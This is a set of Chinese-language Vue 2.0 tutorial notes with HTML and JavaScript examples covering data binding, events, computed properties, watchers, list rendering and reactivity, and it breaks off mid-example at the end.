## Vue2.0

#### 005_Hello 小案例

```html
<!-- 准备好一个容器 -->
<div id="root">
  <h1>Hello, {{name}}</h1>
</div>
<script type="text/javascript">
  Vue.config.productionTip = false

  // 创建vue实例
  new Vue({
    el: '#root',
    data: {
      name: '尚硅谷',
      age: 18
    }
  })
</script>
```

#### 006_Hello 案例分析

1. 多个容器对应一个实例

```html
<!-- 准备好一个容器 -->
<!-- 多个容器对应一个实例 -->
<div class="root">
  <h1>Hello, {{name}}</h1>
  <!-- print: Hello, 尚硅谷 -->
</div>

<div class="root">
  <h1>Hello, {{name}}</h1>
  <!-- print: Hello, {{name}} -->
</div>
<script type="text/javascript">
  Vue.config.productionTip = false

  // 创建vue实例
  new Vue({
    el: '.root',
    data: {
      name: '尚硅谷',
      age: 18
    }
  })
</script>
```

2. 一个容器对应多个实例

```html
<!-- 准备好一个容器 -->
<!-- 一个容器对应多个实例 -->
<div id="root">
  <h1>Hello, {{name}}, {{address}}</h1>
  <!-- print: Hello, 尚硅谷,  -->
  <!-- 报错 -->
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  // 创建vue实例
  new Vue({
    el: '#root',
    data: {
      name: '尚硅谷',
    }
  })
  new Vue({
    el: '#root',
    data: {
      address: '黑马',
    }
  })
</script>
```

注意：容器和实例是一一对应的！

真实开发中只有一个Vue实例，并且会配合组件一起使用

#### 007_模版语法

1. **插值语法**（双大括号表达式） 

   1. 功能: 用于解析标签体内容 

   2. 语法: {{xxx}} ，xxxx 会作为 js 表达式解析

2. **指令语法**（以 v-开头）

   1. 功能: 解析标签属性、解析标签体内容、绑定事件 

   2. 举例：v-bind:href = 'xxxx' ，xxxx 会作为 js 表达式被解析 

   3. 说明：Vue 中有有很多的指令，此处只是用 v-bind 举个例子

```html
<div id="root">
  <h1>插值语法</h1>
  <h3>你好，{{name}}</h3>
  <hr/>
  <h1>指令语法</h1>
  <a v-bind:href="school.url">点我去{{school.name}}1</a>
  <a :href="school.url.toUpperCase()">点我去{{school.name}}2</a>
  <a :href="school.url">点我去{{school.name}}3</a>
</div>
<script type="text/javascript">
  Vue.config.productionTip = false;

  new Vue({
    el: '#root',
    data: {
      name: 'jack',
      school: {
        url: 'http://www.baidu.com',
        name: '百度'
      }
    }
  })
</script>
```

#### 008_数据绑定

##### 单向数据绑定

1. 语法：v-bind:href ="xxx" 或简写为 :href 

2. 特点：数据只能从 data 流向页面 

##### 双向数据绑定

1. 语法：v-mode:value="xxx" 或简写为 v-model="xxx" 

2. 特点：数据不仅能从 data 流向页面，还能从页面流向 data

```html
<div id="root">
  <!-- 传统写法 -->
  单向数据绑定：<input type="text" v-bind:value="name"><br> 双向数据绑定：
  <input type="text" v-model:value="name">
  <!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上: 有value值的元素 -->
  <h2 v-model:x="name">你好啊</h2>
  <!-- 简写 -->
  单向数据绑定：<input type="text" :value="name"><br> 双向数据绑定：
  <input type="text" v-model="name">
</div>
<script type="text/javascript">
  Vue.config.productionTip = false;
  new Vue({
    el: '#root',
    data: {
      name: '尚硅谷'
    }
  })
</script>
```

#### 009_el与data的两种写法

##### el的两种写法

```html
<div id="root">
  <h1>你好，{{name}}</h1>
</div>
<script>
  Vue.config.productionTip = false
  // 实例v
  const v = new Vue({
    // el: '#root',     // 第一种写法
    data: {
      name: '尚硅谷'
    }
  })
  console.log(v)
  setInterval(() => {
    // $mount 原型链中的属性
    // mount: 挂载
    v.$mount('#root')   // 第二种写法
  }, 1000)
</script>
```

##### data的两种写法

```html
<div id="root">
  <h1>你好，{{name}}</h1>
</div>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    // 第一种写法：对象式
    // data: {
    //     name: '尚硅谷'
    // }

    // 第二种写法：函数式
    // data:function() {}
    // 简写：
    data() {
      console.log(this) // 此处的this是Vue实例对象
      return {
        name: '尚硅谷'
      }
    }
  })
</script>
```

#### 010_MVVM模型

1. M：模型(Model) ：对应 data 中的数据 

2. V：视图(View) ：模板 

3. VM：视图模型(ViewModel) ： Vue 实例对象

```html
<div id="root">
  <h1>学校名称：{{name}}</h1>
  <h1>学校地址：{{address}}</h1>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      name: '尚硅谷',
      address: '上海'
    }
  })
  console.log(vm);
</script>
```

#### 011_Object.defineProperty()方法

```html
<script>
  Vue.config.productionTip = false
  let number = 18
  let person = {
    name: '张三',
    sex: '男'
  }
  Object.defineProperty(person, 'age', {
    // value: 18,
    // enumerable: true, // 控制属性是否可以枚举，默认false
    // writable: true, // 控制属性是否可以被修改，默认false
    // configurable: true // 控制属性是否可以被删除，默认false

    // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
    get() {
      console.log('有人读取了age属性', number);
      return number
    },

    // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值

    set(value) {
      console.log('有人修改了age属性', value);
    }
  })
  console.log(person); // print: {name: '张三', sex: '男', age: 18}
  console.log(Object.keys(person)); // print: ['name', 'sex']
  for (let key in person) {
    console.log('@', person[key]);
  }
</script>
```

#### 012_理解数据代理

```html
<script>
  Vue.config.productionTip = false
  let obj = {
    x: 100
  }
  let obj2 = {
    y: 200
  }
  Object.defineProperty(obj2, 'x', {
    get() {
      return obj.x
    },
    set(value) {
      obj.x = value
    }
  })
</script>
```

#### 013_Vue中的数据代理

```html
<div id="root">
  <h1>学校名称：{{name}}</h1>
  <h1>学校地址：{{address}}</h1>
</div>
<script>
  Vue.config.productionTip = false
  let data = {
    name: '尚硅谷',
    address: '上海'
  }
  const vm = new Vue({
    el: '#root',
    data
  })
  console.log(vm._data === data); // print: true
</script>
```

1. Vue中的数据代理：
   1. 通过vm对象来代理data对象中属性的操作（读 / 写）

2. Vue中数据代理的好处：
   1. 更加方便的操作data中的数据
3. 基本原理：
   1. 通过Object.defineProperty()方法把data对象中所有属性添加到vm上
   2. 为每一个添加到vm上的属性，都指定一个getter / setter
   3. 在getter / setter内部去操作（读 / 写）data中对应的属性

#### 014_事件处理

1. v-on:xxx="fun" 

2. @xxx="fun" 

3. @xxx="fun(参数)" 

4. 默认事件形参: event 

5. 隐含属性对象: $event

```html
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <!-- 传统写法 -->
  <button v-on:click="showInfo1">点我提示信息1</button>
  <!-- 简写 -->
  <button @click="showInfo2(66, $event)">点我提示信息2</button>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      name: '尚硅谷'
    },
    methods: {
      showInfo1(event) {
        alert('同学你好！')
        console.log(event.target); // print: <button>点我提示信息</button>
        console.log(this); // print: Vue实例对象
        // 此处this = vm
      },
      showInfo2(number, a) {
        console.log(number, a);
        alert('同学你好！！')
      }
    }
  })
</script>
```

#### 015_事件修饰符

1. .prevent : 阻止事件的默认行为 event.preventDefault() 

2. .stop : 停止事件冒泡 event.stopPropagation()
3. .once : 事件只触发一次（常用）
4. .capture : 使用事件的捕获模式
5. .self : 只有event.target是当前操作的元素时才触发事件
6. .passive : 事件的默认行为立即执行，无需等待事件回调执行完毕

```html
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>
  <div class="demo1" @click="showInfo">
    <button @click.stop="showInfo">点我提示信息</button>
    <!-- 修饰符可以连续写 -->
    <a href="http://www.baidu.com" @click.stop.prevent="showInfo">点我提示信息</a>
  </div>
  <button @click.once="showInfo">点我提示信息</button>
  <div class="box1" @click.capture="showMsg(1)">
    div1
    <div class="box2" @click="showMsg(2)">div2</div>
  </div>
  <div class="demo1" @click.self="showInfo">
    <button @click="showInfo">点我提示信息</button>
  </div>
  <ul @wheel.passive="demo" class="list">
    <li>1</li>
    <li>2</li>
    <li>3</li>
    <li>4</li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      name: '尚硅谷'
    },
    methods: {
      showInfo(e) {
        // e.preventDefault()
        // e.stopPropagation()
        console.log(e.target);
        alert('同学你好')
      },
      showMsg(msg) {
        // alert('同学你好')
        console.log(msg);
      },
      demo() {
        for (let i = 0; i < 100000; i++) {
          console.log('#')
        }
        console.log('累坏了');
      }
    }
  })
</script>
```

#### 016_键盘事件

##### 按键修饰符：

1. keycode : 操作的是某个 keycode 值的键 

2. .keyName : 操作的某个按键名的键(少部分)

##### 重要知识点：

1. Vue中常用的按键别名
   1. 回车 --> enter
   2. 删除 --> delete（捕获“删除”和“退格”键）
   3. 退出 --> esc
   4. 空格 --> space
   5. 换行 --> tab（特殊，必须配合keydown使用）
   6. 上     --> up
   7. 下     --> down
   8. 左     --> left
   9. 右     --> right
2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case(短横线命名)
3. 系统修饰符（用法特殊）：command、option、control、shift
   1. 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发
   2. 配合keydown使用：正常触发事件
4. 也可以使用keyCode去指定具体的按键（不推荐）
5. Vue.config.keyCode.自定义键名 = 键码，可以去定制按键别名

```html
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo">
  <input type="text" placeholder="按下回车提示输入" @keyup.delete="showInfo">
  <input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo">
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      name: '尚硅谷'
    },
    methods: {
      showInfo(e) {
        //     if (e.keyCode !== 13) return
        //     console.log(e.target.value);
        // }
        console.log(e.target.value);
      }
    }
  })
</script>
```

#### 018_姓名案例

##### 插值语法实现：

```html
<div id="root">
  姓：<input type="text" v-model="firstName"><br> 名：
  <input type="text" v-model="lastName"><br> 全名：
  <!-- slice 截取数组 slice(start, end) -->
  <span>{{firstName.slice(0,3)}}-{{lastName}}</span>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      firstName: '张',
      lastName: '三',
    }
  })
</script>
```

##### methods实现：

```html
<div id="root">
  姓：<input type="text" v-model="firstName"><br> 名：
  <input type="text" v-model="lastName"><br> 全名： 
  <span>{{fullName()}}</span>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      firstName: '张',
      lastName: '三',
    },
    methods: {
      fullName() {
        return this.firstName + '-' + this.lastName
      }
    }
  })
</script>
```

##### 计算属性实现：

1. 要显示的数据不存在，要通过计算得来。 

2. 在 computed 对象中定义计算属性。 

3. 在页面中使用{{方法名}}来显示计算的结果。

**知识点：**

1. 定义：要用的属性不存在，要通过已有属性计算得来
2. 原理：底层借助了Object.defineProperty方法提供的getter和setter
3. get函数什么时候执行？
   1. 初次读取会执行一次
   2. 当依赖的数据发生变化时会被再次调用
4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便
5. 备注：
   1. 计算属性最终会出现在vm上，直接读取使用即可
   2. 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变

**完整写法**

```html
<div id="root">
  姓：<input type="text" v-model="firstName"><br> 名：
  <input type="text" v-model="lastName"><br> 全名：
  <span>{{fullName}}</span>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      firstName: '张',
      lastName: '三'
    },
    computed: {
      fullName: {
        // get 什么时候被调用？
        // 1. 初次读取fullName时
        // 2. 所依赖的数据发生变化时
        get() {
          return this.firstName + '-' + this.lastName
        },
        // set 什么时候调用？
        // 当fullName被修改时
        set(value) {
          // console.log('set', value);
          const arr = value.split('-')
          this.firstName = arr[0]
          this.lastName = arr[1]
        }
      }
    }

  })
</script>
```

**简写**

```html
<div id="root">
  姓：<input type="text" v-model="firstName"><br> 名：
  <input type="text" v-model="lastName"><br> 全名：
  <span>{{fullName}}</span>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      firstName: '张',
      lastName: '三'
    },
    computed: {
      // 简写
      fullName() {
        return this.firstName + '-' + this.lastName
      }
    }
  })
</script>
```

#### 021_天气案例

```html
<div id="root">
  <h2>今天天气真{{info}}</h2>
  <button @click="changeWeather">切换天气</button>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      isHot: true
    },
    computed: {
      info() {
        return this.isHot ? '炎热' : '凉爽'
      }
    },
    methods: {
      changeWeather() {
        this.isHot = !this.isHot
      }
    }
  })
</script>
```

##### 监视属性watch：

1. 通过通过 vm 对象的$watch()或 watch 配置来监视指定的属性 

2. 当属性变化时, 回调函数自动调用, 在函数内部进行计算

**知识点：**

1. 当被监视器的属性变化时，回调函数自动调用，进行相关操作
2. 监视的属性必须存在，才能进行监视！
3. 监视的两种写法：
   1. new Vue时传入watch配置
   2. 通过vm.$watch监视

```html
<div id="root">
  <h2>今天天气真{{info}}</h2>
  <button @click="changeWeather">切换天气</button>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      isHot: true
    },
    computed: {
      info() {
        return this.isHot ? '炎热' : '凉爽'
      }
    },
    methods: {
      changeWeather() {
        this.isHot = !this.isHot
      }
    },
    // 第一种：
    watch: {
      isHot: {
        immediate: true, // 初始化时让handler调用一下
        // handler什么时候调用？
        // 当isHot发生改变时
        handler(newValue, oldValue) {
          console.log('isHot被修改了', newValue, oldValue);
        }
      }
    }
  })

  // 第二种：
  vm.$watch('isHot', {
    immediate: true,
    handler(newValue, oldValue) {
      console.log('isHot被修改了', newValue, oldValue);
    }
  })
</script>
```

#### 023_深度监视

**知识点：**

深度监视：

​	1. Vue中的watch默认不监测对象内部值的改变（一层）

​	2. 配置deep: true可以监视对象内部值改变（多层）

备注：

	1. Vue自身可以监视对象内部值的改变，但Vue提供的watch默认不可以
	1. 使用watch时根据数据的具体结构，决定是否采用深度监视

```html
<div id="root">
  <h2>今天天气真{{info}}</h2>
  <button @click="changeWeather">切换天气</button>
  <hr>
  <h3>a的值是{{numbers.a}}</h3>
  <button @click="numbers.a++">点我让a加1</button>
  <h3>b的值是{{numbers.b}}</h3>
  <button @click="numbers.b++">点我让b加1</button>
  <button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button> {{numbers.c.d.e}}
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      isHot: true,
      numbers: {
        a: 1,
        b: 1,
        c: {
          d: {
            e: 88
          }
        }
      }
    },
    computed: {
      info() {
        return this.isHot ? '炎热' : '凉爽'
      }
    },
    methods: {
      changeWeather() {
        this.isHot = !this.isHot
      }
    },
    watch: {
      isHot: {
        handler(newValue, oldValue) {
          console.log('isHot被修改了', newValue, oldValue);
        }
      },
      // 监视多级结构中某个属性的变化
      // 'numbers.a': {
      //     handler() {
      //         console.log('a改变了');
      //     }
      // }
      numbers: {
        // 监视多级结构中所有属性的变化
        deep: true, // 深度监视
        handler() {
          console.log('number改变');
        }
      }
    }
  })
</script>
```

#### 024_监视属性简写

```html
<div id="root">
  <h2>今天天气真{{info}}</h2>
  <button @click="changeWeather">切换天气</button>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      isHot: true,
    },
    computed: {
      info() {
        return this.isHot ? '炎热' : '凉爽'
      }
    },
    methods: {
      changeWeather() {
        this.isHot = !this.isHot
      }
    },
    watch: {
      // 正常写法：
      isHot: {
        // immediate:true,
        // deep:true,
        handler(newValue, oldValue) {
          console.log('isHot被修改了1', newValue, oldValue);
        }
      },

      // 简写：
      isHot(newValue, oldValue) {
        console.log('isHot被修改了2', newValue, oldValue);
      }
    }
  })

  // 正常写法：
  vm.$watch('isHot', {
    handler(newValue, oldValue) {
      console.log('isHot被修改了3', newValue, oldValue);
    }
  })

  // 简写：
  vm.$watch('isHot', function(newValue, oldValue) {
    console.log('isHot被修改了', newValue, oldValue);
  })
</script>
```

#### 025_watch对比computed

computed和watch之间的区别：

1. computed能完成的功能，watch也能完成
2. watch能完成的功能，computed不一定能完成。例如：watch可以进行异步操作

两个重要的小原则：

1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
2. 所有不被Vue管理的函数（定时器的回调函数、ajax的回调函数、Promise的回调函数等），最好写成箭头函数。这样this的指向才是vm 或 组件实例对象

```html
<div id="root">
  姓：<input type="text" v-model="firstName"><br> 名：
  <input type="text" v-model="lastName"><br> 全名：
  <!-- <span>{{fullName}}</span> -->
  <div id="root">{{ fullName }}</div>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      firstName: '张',
      lastName: '三',
      fullName: '张-三'
    },
    watch: {
      firstName(val) {
        setTimeout(() => {
          this.fullName = val + '-' + this.lastName
        }, 1000)

      },
      lastName(val) {
        this.fullName = this.firstName + '-' + val
      }
    }
  })
</script>
```

#### 026_绑定class样式

```html
<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
    <style>
      .basic {
        width: 400px;
        height: 100px;
        border: 1px solid black;
      }

      .happy {
        border: 5px solid red;
        background: orange;
      }

      .sad {
        border: 5px solid green;
        background-color: grey;
      }

      .normal {
        background-color: skyblue;
      }

      .atguigu1 {
        background-color: green;
      }

      .atguigu2 {
        font-size: 30px;
      }

      .atguigu3 {
        border-radius: 20px;
      }
    </style>
  </head>

  <body>
    <div id="root">
      <!-- 绑定class样式 --- 字符串写法 适用于样式的类名不确定 需要动态指定 -->
      <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
      <br />

      <!-- 绑定class样式 --- 数组写法 要绑定的样式个数不确定、名字也不确定 -->
      <div class="basic" :class="classArr">{{name}}</div>

      <!-- 绑定class样式 --- 对象写法 要绑定的样式个数确定、名字也确定 但要动态决定用不用-->
      <div class="basic" :class="classObj">{{name}}</div>
    </div>
    <script>
      Vue.config.productionTip = false
      const vm = new Vue({
        el: '#root',
        data: {
          name: '尚硅谷',
          mood: 'normal',
          classArr: [
            'atguigu1',
            'atguigu2',
            'atguigu3'
          ],
          classObj: {
            atguigu1: false,
            atguigu2: false
          }
        },
        methods: {
          changeMood() {
            const arr = ['happy', 'sad', 'normal']
            const index = Math.floor(Math.random() * 3)
            this.mood = arr[index]
            // console.log(index);
          }
        }
      })
    </script>
  </body>

</html>
```

#### 028_条件渲染

##### 1. v-if

写法：

（1）.v-if="表达式"

（2）.v-else-if="表达式"

（3）.v-else="表达式"

适用于：切换频率较低的场景

特点：不展示的DOM元素直接被移除

注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”。

##### 2. v-show

写法：

​		v-show="表达式"

适用于：切换频率较高的场景

特点：不展示DOM元素未被移除，仅仅是使用样式隐藏掉

##### 备注：

使用v-if时，元素可能无法获取到，而使用v-show一定能获取到

```html
<div id="root">
  <h2>当前的n: {{n}}</h2>
  <button @click="n++">点我n+1</button>
  <h2 v-show="true">欢迎来到{{name}}</h2>
  <h2 v-if="false">欢迎来到{{name}}</h2>

  <div v-show="n === 1">Angular</div>
  <div v-show="n === 2">React</div>
  <div v-show="n === 3">Vue</div>

  <!-- v-if 和template 的配合 -->
  <template v-if="n === 1">
    <h2>你好</h2>
    <h2>尚硅谷</h2>
    <h2>北京</h2>
  </template>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      name: '尚硅谷',
      n: 0
    }
  })
</script>

```

#### 029_列表渲染

```html
<div id="root">
  <!-- 遍历数组 -->
  <h2>人员列表</h2>
  <ul>
    <li v-for="(item, index) in persons" :key="index">
      {{item.name}}-{{item.age}}
    </li>
  </ul>
  <hr>
  <!-- 遍历对象 -->
  <h2>汽车信息</h2>
  <ul>
    <li v-for="(value, index) in car" :key="index">
      {{index}}-{{value}}
    </li>
  </ul>
  <hr>
  <!-- 遍历字符串 -->
  <h2>测试遍历字符串</h2>
  <ul>
    <li v-for="(char, index) in str" :key="index">
      {{index}}-{{char}}
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      persons: [{
        id: '001',
        name: '张三',
        age: 18
      }, {
        id: '002',
        name: '李四',
        age: 19
      }, {
        id: '003',
        name: '王五',
        age: 20
      }],
      car: {
        name: '奔驰',
        price: '70万',
        color: '黑色'
      },
      str: 'hello'
    }
  })
</script>
```

#### 030_key作用与原理

面试题：react、vue中的key有什么作用？（key的原理）

1. 虚拟DOM中key的作用： 	
   1. key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下： 									 

2. 对比规则： 	

   1. 旧虚拟DOM中找到了与新虚拟DOM相同的key： 	     	①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！ 	     

      ​	②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。 		

   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key创建新的真实DOM，随后渲染到到页面。 	

3. 用index作为key可能会引发的问题： 	
   1.  若对数据进行：逆序添加、逆序删除等破坏顺序操作:                 会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。 		
   2. 如果结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题。 	

4. 开发中如何选择key?: 	
   1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。 	
   2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。 	
   3. 如果不写key，则默认为index

```html
<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
  </head>

  <body>
    <div id="root">
      <!-- 遍历数组 -->
      <h2>人员列表</h2>
      <button @click.once="add">添加一个老刘</button>
      <ul>
        <li v-for="(item, index) in persons" :key="item.id">
          {{item.name}}-{{item.age}}
          <input type="text">
        </li>
      </ul>
    </div>
    <script>
      Vue.config.productionTip = false
      new Vue({
        el: '#root',
        data: {
          persons: [{
            id: '001',
            name: '张三',
            age: 18
          }, {
            id: '002',
            name: '李四',
            age: 19
          }, {
            id: '003',
            name: '王五',
            age: 20
          }]
        },
        methods: {
          add() {
            const p = {
              id: '004',
              name: '老刘',
              age: 60
            }
            this.persons.push(p)
          }
        }
      })
    </script>
  </body>

</html>
```

#### 031_列表过滤

```html
<div id="root">
  <!-- 遍历数组 -->
  <input type="text" placeholder="输入姓名" v-model:value="keyWord">
  <ul>
    <li v-for="(item, index) in filpersons" :key="index">
      {{item.name}}-{{item.age}}-{{item.sex}}
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      keyWord: '',
      persons: [{
        id: '001',
        name: '马冬梅',
        sex: '女',
        age: 20
      }, {
        id: '001',
        name: '周冬雨',
        sex: '女',
        age: 18
      }, {
        id: '001',
        name: '周杰伦',
        sex: '男',
        age: 22
      }, {
        id: '001',
        name: '温兆伦',
        sex: '男',
        age: 21
      }],
      // filpersons: [] // watch实现定义的
    },
    // 用watch实现
    // watch: {
    //     keyWord: {
    //         immediate: true,
    //         handler(val) {
    //             console.log('keyWord被改变了', val);
    //             this.filpersons = this.persons.filter((p) => {
    //                 return p.name.indexOf(val) !== -1
    //             })
    //         },

    //     }
    // },

    // 用computed实现
    computed: {
      filpersons() {
        return this.persons.filter((p) => {
          return p.name.indexOf(this.keyWord) !== -1
        })
      }

    }
  })
</script>
```

#### 032_列表排序

```html
<div id="root">
  <input type="text" placeholder="输入姓名" v-model:value="keyWord">
  <button @click="sortType = 2">年龄升序</button>
  <button @click="sortType = 1">年龄降序</button>
  <button @click="sortType = 0">原顺序</button>
  <ul>
    <li v-for="(item, index) of filpersons" :key="item.id">
      {{item.name}}-{{item.age}}-{{item.sex}}
      <input type="text">
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      keyWord: '',
      sortType: 0, // 0代表原顺序 1代表降序 2代表升序
      persons: [{
        id: '001',
        name: '马冬梅',
        sex: '女',
        age: 20
      }, {
        id: '002',
        name: '周冬雨',
        sex: '女',
        age: 18
      }, {
        id: '003',
        name: '周杰伦',
        sex: '男',
        age: 22
      }, {
        id: '004',
        name: '温兆伦',
        sex: '男',
        age: 21
      }]
    },
    computed: {
      filpersons() {
        const arr = this.persons.filter((p) => {
          return p.name.indexOf(this.keyWord) !== -1
        })
        // 判断是否需要排序
        if (this.sortType) {
          arr.sort((a, b) => {
            return this.sortType === 1 ? b.age - a.age : a.age - b.age
          })
        }
        return arr
      }

    }
  })
</script>
```

#### 033_更新时的一个问题

```html
<div id="root">
  <button @click="updateMei">更新马冬梅的信息</button>
  <ul>
    <li v-for="(item, index) of persons" :key="item.id">
      {{item.name}}-{{item.age}}-{{item.sex}}
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      persons: [{
        id: '001',
        name: '马冬梅',
        sex: '女',
        age: 20
      }, {
        id: '002',
        name: '周冬雨',
        sex: '女',
        age: 18
      }, {
        id: '003',
        name: '周杰伦',
        sex: '男',
        age: 22
      }, {
        id: '004',
        name: '温兆伦',
        sex: '男',
        age: 21
      }]
    },
    methods: {
      updateMei() {
        // this.persons[0].name = '马牛逼', //
        //     this.persons[0].sex = '男', //
        //     this.persons[0].age = 50 //
        this.persons[0] = {
          id: '001',
          name: '马牛逼',
          sex: '男',
          age: 50
        }
      }
    }
  })
</script>
```

#### 034_模拟一个数据监测

```js
let data = {
  name: '尚硅谷',
  address: '北京'
}

let vm = {};

const obs = new Observer(data)
console.log(obs);
vm._data = data = obs

function Observer(obj) {
  const keys = Object.keys(obj)
  console.log(keys);
  keys.forEach((k) => {
    Object.defineProperty(this, k, {
      get() {
        return obj[k]
      },
      set(val) {
        console.log(`${k}被修改了`);
        obj[k] = val
      }
    })
  })
}
```

#### 035_Vue.set()方法

```html
<div id="root">
  <h2>学校名称：{{school.name}}</h2>
  <h2>学校地址：{{school.address}}</h2>
  <h2>校长是：{{school.master}}</h2>
  <hr>
  <button @click="addSex">点我添加性别</button>
  <h2>学生姓名：{{student.name}}</h2>
  <h2 v-if="student.sex">学生性别：{{student.sex}}</h2>
  <h2>学生年龄：真实{{student.age.rAge}}</h2>
  <h2>学生年龄：虚假{{student.age.sAge}}</h2>
  <h2>朋友们</h2>
  <ul>
    <li v-for="(f, index) in student.friends" :key="index">
      {{f.name}}--{{f.age}}
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      school: {
        name: '尚硅谷',
        address: '北京',
        master: '王校长'
      },
      student: {
        name: 'tom',
        age: {
          rAge: 40,
          sAge: 18
        },
        friends: [{
          name: 'jerry',
          age: 20
        }, {
          name: 'tony',
          age: 36
        }]
      }
    },
    methods: {
      addSex() {
        // Vue.set(this.student, 'sex', '男')
        this.$set(this.student, 'sex', '男')
      }
    }

  })
</script>
```

#### 036_Vue监测数据改变的原理_数组

```html
<div id="root">
  <h2>学校名称：{{school.name}}</h2>
  <h2>学校地址：{{school.address}}</h2>
  <h2>校长是：{{school.master}}</h2>
  <hr>
  <button @click="addSex">点我添加性别</button>
  <h2>学生姓名：{{student.name}}</h2>
  <h2 v-if="student.sex">学生性别：{{student.sex}}</h2>
  <h2>学生年龄：真实{{student.age.rAge}}</h2>
  <h2>学生年龄：虚假{{student.age.sAge}}</h2>
  <h2>朋友们</h2>
  <ul>
    <li v-for="(f, index) in student.friends" :key="index">
      {{f.name}}--{{f.age}}
    </li>
  </ul>
  <h2>爱好</h2>
  <ul>
    <li v-for="(h, index) in student.hobby" :key="index">
      {{h}}
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      school: {
        name: '尚硅谷',
        address: '北京',
        master: '王校长'
      },
      student: {
        name: 'tom',
        age: {
          rAge: 40,
          sAge: 18
        },
        hobby: [
          '打游戏',
          '睡觉',
          '敲代码'
        ],
        friends: [{
          name: 'jerry',
          age: 20
        }, {
          name: 'tony',
          age: 36
        }]
      }
    },
    methods: {
      addSex() {
        // Vue.set(this.student, 'sex', '男')
        this.$set(this.student, 'sex', '男')
      }
    }
  })
</script>
```

#### 037_大总结——Vue数据监测

Vue监视数据的原理：

1. vue会监视data中所有层次的数据。

2.  如何监测对象中的数据？

   ​	通过setter实现监视，且要在new Vue时就传入要监测的数据。

   1. 对象中后追加的属性，Vue默认不做响应式处理，即改变其值页面无变化

   2. 如需给后添加的属性做响应式，请使用如下API：
      Vue.set(target，propertyName/index，value) 

       或 
      vm.$set(target，propertyName/index，value)  //vm.$set(添加目标,'添加属性/索引值','属性值')

3. 如何监测数组中的数据？
   新元素的方法实现，本质就是做了两件事：
   1. 调用原生对应的方法对数组进行更新。
   2. 重新解析模板，进而更新页面。

4. 在Vue修改数组中的某个元素一定要用如下方法：
   1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   2. Vue.set() 或 vm.$set()
   3. 如果不使用上面方法而是直接对数组赋值则vue无法响应，例如：
      this.student.hobby[0] = "开车"，数据已被更改，但页面中无任何反应
   4. 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象(vm._data) 添加属性！！！

```html
<div id="root">
  <h1>学生信息</h1>
